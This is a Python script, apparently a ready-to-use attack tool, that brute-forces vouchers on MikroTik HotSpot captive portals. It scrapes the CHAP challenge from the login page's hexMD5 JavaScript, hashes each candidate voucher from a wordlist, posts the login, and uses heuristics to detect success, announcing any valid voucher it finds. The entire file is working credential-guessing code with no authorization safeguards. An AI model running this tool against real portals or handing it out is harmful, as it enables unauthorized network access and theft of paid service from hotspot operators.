#!/usr/bin/env python3
# mikrotik_jsmd5_login.py
# Enhanced version with professional interface and verbose mode

import sys
import os
import re
import requests
import hashlib
import argparse
import signal
import time
from urllib.parse import urlparse, urljoin
from datetime import datetime

class MikroTikLoginTester:
    def __init__(self, timeout=8, verbose=False):
        self.UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
        self.TIMEOUT = timeout
        self.verbose = verbose
        self.session_counter = 0
        self.start_time = datetime.now()
        self.successful_logins = []
        self.failed_logins = []
        self.should_stop = False
        
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C """
        print(f"\n\n⚠️  Received interrupt signal. Shutting down...")
        self.should_stop = True

    def norm_url(self, u):
        if not u.startswith("http://") and not u.startswith("https://"):
            u = "http://" + u
        p = urlparse(u)
        if p.path in ("", "/"):
            return urljoin(u, "/login")
        return u

    def extract_login_data(self, html, base_url):
        """
        Extract login form action and challenge data with multiple fallback methods
        """
        form_patterns = [
            r'<form[^>]*(name=["\']sendin["\']|name=["\']login["\'])[^>]*>',
            r'<form[^>]*id=["\']login["\'][^>]*>',
            r'<form[^>]*class=["\'].*login[^>]*>'
        ]
        
        action = None
        for pattern in form_patterns:
            mform = re.search(pattern, html, re.IGNORECASE)
            if mform:
                tag = mform.group(0)
                ma = re.search(r'action=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                if ma:
                    action = urljoin(base_url, ma.group(1))
                    break
        
        if not action:
            ma2 = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.IGNORECASE)
            if ma2:
                action = urljoin(base_url, ma2.group(1))
        
        md5_patterns = [
            r"hexMD5\(\s*'([^']*)'\s*\+\s*document\.login\.password\.value\s*\+\s*'([^']*)'\)",
            r"hexMD5\(\s*'([^']*)'\s*\+\s*[^\)]+\.password\.value\s*\+\s*'([^']*)'\)",
            r"hexMD5\([^\)]*document\.forms\[[^\]]+\]\.elements\[[^\]]+\][^\)]*\)"
        ]
        
        combined = ""
        for pattern in md5_patterns:
            m = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
            if m:
                prefix = m.group(1) if m.group(1) else ""
                suffix = m.group(2) if len(m.groups()) > 1 else ""
                combined = prefix + suffix
                break
        else:
            m2 = re.search(r"hexMD5\([^)]+\)", html.replace('\n', ' '), re.IGNORECASE)
            if m2:
                combined = m2.group(0)
            else:
                return action, None
        
        octals = re.findall(r'\\([0-7]{1,3})', combined)
        if not octals:
            return action, None
        
        try:
            b = bytes(int(o, 8) for o in octals)
            if len(b) >= 2:
                chap_id = bytes([b[0]])
                challenge = b[1:]
                return action, (chap_id, challenge)
        except ValueError as e:
            if self.verbose:
                print(f"⚠️  Error parsing octals: {e}")
        
        return action, None

    def md5_hex(self, chap_id_bytes, voucher_bytes, challenge_bytes):
        m = hashlib.md5()
        m.update(chap_id_bytes + voucher_bytes + challenge_bytes)
        return m.hexdigest()

    def is_successful_response(self, resp, voucher):
        """
        Enhanced success detection with multiple indicators
        """
        txt = resp.text.lower()
        success_indicators = [
            "logout", "you are connected", "selamat datang", "welcome",
            "status", "connected", "berhasil", "success",
            "account information", "user info", "remaining time"
        ]
        
        failure_indicators = [
            "invalid", "gagal", "failed", "error", "wrong",
            "tidak valid", "maaf", "sorry", "login again"
        ]
        
        if resp.history and any(r.status_code in (301, 302, 303) for r in resp.history):
            return True
        
        success_count = sum(1 for indicator in success_indicators if indicator in txt)
        failure_count = sum(1 for indicator in failure_indicators if indicator in txt)
        
        voucher_failure = any([
            f"voucher {voucher}" in txt,
            f"username {voucher}" in txt,
            voucher.lower() in txt and any(fail in txt for fail in failure_indicators)
        ])
        
        if success_count > failure_count and not voucher_failure:
            return True
        elif resp.status_code in (302, 303) and not voucher_failure:
            return True
        elif success_count >= 2:
            return True
        
        return False

    def print_progress(self, current, total, voucher, status="Testing"):
        """
        Professional progress display
        """
        if total == 0:  
            print(f"\r🔍 Testing: {voucher} - {status}", end="", flush=True)
            return
            
        progress = (current / total) * 100
        bar_length = 30
        filled_length = int(bar_length * current // total)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        sys.stdout.write(
            f"\r[{bar}] {progress:.1f}% | {current}/{total} | {status}: {voucher:<15}"
        )
        sys.stdout.flush()

    def validate_inputs(self, portal, wordlist_path=None, single_voucher=None):
        """
        Validate input parameters before testing
        """
        if not re.match(r'^https?://', portal, re.IGNORECASE):
            portal = 'http://' + portal
        
        try:
            response = requests.head(portal, timeout=5, allow_redirects=True, headers={"User-Agent": self.UA})
            if response.status_code >= 400:
                print(f"⚠️  Warning: Portal returned status {response.status_code}")
        except requests.RequestException as e:
            print(f"⚠️  Warning: Cannot reach portal - {e}")
        
        if wordlist_path:
            if not os.path.exists(wordlist_path):
                raise FileNotFoundError(f"Wordlist file not found: {wordlist_path}")
            
            if not os.path.isfile(wordlist_path):
                raise ValueError(f"Path is not a file: {wordlist_path}")
            
            file_size = os.path.getsize(wordlist_path)
            if file_size == 0:
                raise ValueError("Wordlist file is empty")
            
            if file_size > 100 * 1024 * 1024:  
                print("⚠️  Warning: Wordlist file is very large (>100MB)")
        
        return portal

    def print_verbose_request(self, response, request_type="GET"):
        """Print detailed request and response information in verbose mode"""
        if not self.verbose:
            return

        print(f"\n┌─── VERBOSE {request_type} REQUEST ───")
        print(f"├─ URL: {response.request.url}")
        print(f"├─ Method: {response.request.method}")
        print(f"├─ Headers:")
        for key, value in response.request.headers.items():
            print(f"│   {key}: {value}")

        if response.request.body:
            print(f"├─ Body: {response.request.body}")

        print(f"├─── RESPONSE ───")
        print(f"├─ Status Code: {response.status_code}")
        print(f"├─ Headers:")
        for key, value in response.headers.items():
            print(f"│   {key}: {value}")

        response_preview = response.text[:500] + "..." if len(response.text) > 500 else response.text
        print(f"├─ Response Preview: {response_preview}")
        print(f"└─────────────────────────────────────────────\n")

    def test_single_voucher(self, portal, voucher):
        """Test a single voucher"""
        print(f"🎯 Single Voucher Mode")
        print(f"🔑 Testing voucher: {voucher}")
        print(f"🌐 Portal: {portal}")
        print("─" * 70)

        return self._test_voucher_implementation(portal, [voucher], show_progress=False)

    def test_wordlist(self, portal, wordlist_path, delay=0, show_progress=True):
        """Test vouchers from wordlist file"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                vouchers = [line.strip() for line in f.readlines() if line.strip()]
        except Exception as e:
            print(f"❌ Failed to read wordlist: {e}")
            return None

        if not vouchers:
            print("❌ Wordlist is empty.")
            return None

        print(f"📦 Loaded {len(vouchers)} vouchers from {wordlist_path}")
        print(f"🌐 Portal: {portal}")
        if delay > 0:
            print(f"⏰ Delay: {delay} seconds between attempts")
        print("🚀 Starting voucher testing...")
        print("─" * 70)

        return self._test_voucher_implementation(portal, vouchers, delay, show_progress)

    def _test_voucher_implementation(self, portal, vouchers, delay=0, show_progress=True):
        """Internal implementation for testing vouchers"""
        login_url = self.norm_url(portal)
        successful_voucher = None

        for i, voucher in enumerate(vouchers, 1):
            if self.should_stop:
                print("\n⏹️  Testing stopped")
                break

            if show_progress:
                self.print_progress(i, len(vouchers), voucher, "Testing")
            else:
                print(f"\n[{i}/{len(vouchers)}] Testing voucher: {voucher}", end=" ")

            s = requests.Session()
            s.headers.update({"User-Agent": self.UA})
            self.session_counter += 1

            try:
                r = s.get(login_url, timeout=self.TIMEOUT, allow_redirects=True)
                self.print_verbose_request(r, "GET Login Page")
            except Exception as e:
                if show_progress:
                    print(f"\n❌ Failed to get login page: {e}")
                else:
                    print(f"❌ (Failed to get login page: {e})")
                continue

            html = r.text
            action, octal_pair = self.extract_login_data(html, login_url)
            post_target = action or login_url

            if not octal_pair:
                if self.verbose:
                    print("ℹ️  Fallback to PAP authentication method")
                data = {"username": voucher, "password": voucher, "dst": "", "popup": "true"}
            else:
                chap_id, challenge = octal_pair
                if self.verbose:
                    print(f"🔐 CHAP Auth - ID: {chap_id.hex()}, Challenge: {challenge.hex()}")

                voucher_b = voucher.encode('utf-8')
                resp_hex = self.md5_hex(chap_id, voucher_b, challenge)

                if self.verbose:
                    print(f"🔑 Generated MD5 Hash: {resp_hex}")

                data = {
                    "username": voucher,
                    "password": resp_hex,
                    "dst": "",
                    "popup": "true"
                }

            if self.verbose:
                print(f"📤 POST Target: {post_target}")
                print(f"📝 POST Data: {data}")

            try:
                r2 = s.post(post_target, data=data, timeout=self.TIMEOUT, allow_redirects=True)
                self.print_verbose_request(r2, "POST Login")
            except Exception as e:
                if show_progress:
                    print(f"\n❌ POST failed: {e}")
                else:
                    print(f"❌ (POST failed: {e})")
                continue

            if self.is_successful_response(r2, voucher):
                if show_progress:
                    print(f"\n✅ SUCCESS! Valid voucher found: {voucher}")
                else:
                    print(f"✅ SUCCESS!")
                
                successful_voucher = voucher
                self.successful_logins.append(voucher)
                self.print_success_banner(voucher, portal, self.session_counter)
                break
            else:
                if not show_progress:
                    print(f"❌ Failed")
                self.failed_logins.append(voucher)

            if delay > 0 and i < len(vouchers):
                time.sleep(delay)

        return successful_voucher

    def generate_report(self, results, duration, output_file=None):
        """
        Generate comprehensive test report
        """
        report = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                            TEST EXECUTION REPORT                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║    📅 Test Date:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                      ║
║    ⏱️  Duration:     {duration:.2f} seconds                                             ║
║    🔄 Sessions:     {self.session_counter}                                                        ║
║    ✅ Successes:    {len(self.successful_logins)}                                                        ║
║    ❌ Failures:     {len(self.failed_logins)}                                                        ║
║                                                                              ║
"""
        
        if self.successful_logins:
            report += f"""║    🎯 Valid Vouchers:                                                        ║
"""
            for voucher in self.successful_logins:
                report += f"║        • {voucher:<60}        ║\n"
        
        report += """║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        
        print(report)
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report)
            print(f"📄 Report saved to: {output_file}")

    def print_banner(self):
        banner = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███╗   ███╗██╗██╗  ██╗██████╗  ██████╗ ████████╗██╗██╗  ██╗               ║
║    ████╗ ████║██║██║ ██╔╝██╔══██╗██╔═══██╗╚══██╔══╝██║██║ ██╔╝               ║
║    ██╔████╔██║██║█████╔╝ ██████╔╝██║   ██║   ██║   ██║█████╔╝                ║
║    ██║╚██╔╝██║██║██╔═██╗ ██╔══██╗██║   ██║   ██║   ██║██╔═██╗                ║
║    ██║ ╚═╝ ██║██║██║  ██╗██║  ██║╚██████╔╝   ██║   ██║██║  ██╗               ║
║    ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝╚═╝  ╚═╝               ║
║                                                                              ║
║              VOUCHER LOGIN TESTER - PROFESSIONAL EDITION                     ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}                                                 ║
║ Timeout: {self.TIMEOUT} seconds | Verbose: {'Enabled' if self.verbose else 'Disabled'}                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)

    def print_success_banner(self, voucher, portal, session_count):
        success_banner = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                            🎉 SUCCESS FOUND! 🎉                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║    🔑 Voucher: {voucher:<60}  ║
║    🌐 Portal:  {portal:<60}  ║
║    📊 Sessions: {session_count:<58}   ║
║    ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<60}     ║
║                                                                              ║
║              Valid voucher discovered and login successful!                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        print(success_banner)

def main():
    parser = argparse.ArgumentParser(
        description='MikroTik HotSpot Voucher Login Tester - Professional Edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u 192.168.1.1 -w vouchers.txt
  %(prog)s -u https://hotspot.example.com -w wordlist.txt -t 10
  %(prog)s -u 192.168.1.1 -w vouchers.txt -v
  %(prog)s -u 192.168.1.1 --voucher "VOUCHER123" -t 5
  %(prog)s -u 192.168.1.1 -w vouchers.txt -d 0.5 -o report.txt

Features:
  • Multiple authentication method detection
  • Smart success/failure detection
  • Progress tracking and reporting
  • Session management and timeout handling
  • Single voucher testing mode
  • Graceful Ctrl+C handling

Powered by: H4MK4DEV Toolkit
        """
    )

    parser.add_argument('-u', '--url', required=True,
                       help='Portal URL or hostname (e.g., 192.168.1.1 or https://portal.com)')
    parser.add_argument('-w', '--wordlist',
                       help='Path to wordlist file for multiple voucher testing')
    parser.add_argument('--voucher',
                       help='Single voucher to test (alternative to wordlist)')
    parser.add_argument('-t', '--timeout', type=int, default=8,
                       help='Timeout in seconds for HTTP requests (default: 8)')
    parser.add_argument('-d', '--delay', type=float, default=0,
                       help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('-o', '--output', 
                       help='Output file to save results')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose mode for detailed output')
    parser.add_argument('--no-progress', action='store_true',
                       help='Disable progress bar display')

    args = parser.parse_args()

    if not args.wordlist and not args.voucher:
        parser.error("Either --wordlist or --voucher must be provided")
    
    if args.wordlist and args.voucher:
        parser.error("Use either --wordlist or --voucher, not both")

    tester = MikroTikLoginTester(
        timeout=args.timeout, 
        verbose=args.verbose
    )
    
    try:
        tester.print_banner()
        
        validated_portal = tester.validate_inputs(
            args.url, 
            args.wordlist if args.wordlist else None,
            args.voucher if args.voucher else None
        )
        
        result = None
        
        if args.voucher:
            result = tester.test_single_voucher(validated_portal, args.voucher)
        else:
            result = tester.test_wordlist(
                validated_portal, 
                args.wordlist,
                delay=args.delay,
                show_progress=not args.no_progress
            )
        
        duration = (datetime.now() - tester.start_time).total_seconds()
        tester.generate_report(result, duration, args.output)

        print("\n" + "═" * 70)
        print(f"📈 TEST SUMMARY")
        print("═" * 70)
        print(f"🕒 Duration: {duration:.2f} seconds")
        print(f"🔄 Total sessions: {tester.session_counter}")
        print(f"🎯 Target: {validated_portal}")
        if result:
            print(f"✅ Successful voucher: {result}")
        else:
            print("❌ No valid vouchers found")
        print("═" * 70)
        print("🚀 Powered by: H4MK4DEV Toolkit")

    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
